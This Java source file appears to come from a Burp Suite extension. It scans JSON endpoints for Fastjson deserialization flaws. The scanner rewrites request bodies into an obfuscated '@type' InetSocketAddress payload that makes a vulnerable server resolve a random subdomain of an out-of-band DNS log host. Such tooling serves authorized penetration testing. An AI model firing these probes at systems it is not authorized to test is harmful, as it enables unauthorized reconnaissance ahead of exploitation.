package jrcet.frame.Scanner.Fastjson;

import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import jrcet.frame.Setting.Setting;
import jrcet.help.Helper;

import java.util.HashSet;
import java.util.List;
import java.util.Objects;

import static burp.MyExtender.*;

public class Fastjson {
    public static String DNSLOG = "";
    public static String TOKEN = "";

    private static final HashSet<String> UrlSet = new HashSet<>();

    private static String CurrentURL;

    public static void doScan(HttpRequestResponse httpRequestResponse){

        if(!check(httpRequestResponse)) return;

        String randomString = Helper.createRandomString(8);
        String body =  ("\\ufeff{,/*aab*/,'x_' : {/*aab*/\"@type\":\"java.net.InetSocketAddress\"{\"address\":/*aab*/,/*aa\"b*/ \"val\" :\""+randomString+"."+DNSLOG+"\"}}}");

        HttpRequest httpRequest = httpRequestResponse.request();

        HttpRequest newHttpRequest=null;
//        newHttpRequest.withBody(body);
        httpRequest = httpRequest.withBody(body);
        if(Setting.DEBUG) API.logging().output().println(httpRequest.bodyToString());
        httpRequestResponse = API.http().sendRequest(httpRequest);

        HttpResponse httpResponse = httpRequestResponse.response();
        if(Setting.DEBUG) API.logging().output().println(httpResponse.statusCode());
        UrlSet.add(CurrentURL);
    }

    private static boolean check(HttpRequestResponse httpRequestResponse){
        CurrentURL = httpRequestResponse.request().withPath("/").url();
        if(UrlSet.contains(CurrentURL)) return false;

        List<HttpHeader> httpHeaders = httpRequestResponse.request().headers();
        for(HttpHeader httpHeader: httpHeaders){
            if(Objects.equals(httpHeader.name().toLowerCase(), "content-type") && Objects.equals(httpHeader.value().toLowerCase(), "application/json")){
                return true;
            }
        }
        return false;
    }

}
